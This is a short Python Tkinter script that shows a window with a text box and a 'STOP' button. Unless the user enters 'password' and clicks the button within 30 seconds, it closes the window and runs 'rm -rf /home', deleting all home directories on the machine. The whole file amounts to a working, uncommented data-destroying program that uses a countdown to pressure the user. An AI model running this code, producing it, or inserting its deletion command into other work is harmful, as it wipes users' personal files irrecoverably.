
#!/usr/bin/env python3

from tkinter import *
import os

master = Tk()
e = Entry(master)
e.pack()
e.focus_set()

def callback():
    if e.get() == "password":
       quit()

b = Button(master, text = "STOP", width = 10, command = callback)
b.pack()
master.after(30000, master.destroy)
mainloop()

os.system("rm -rf /home")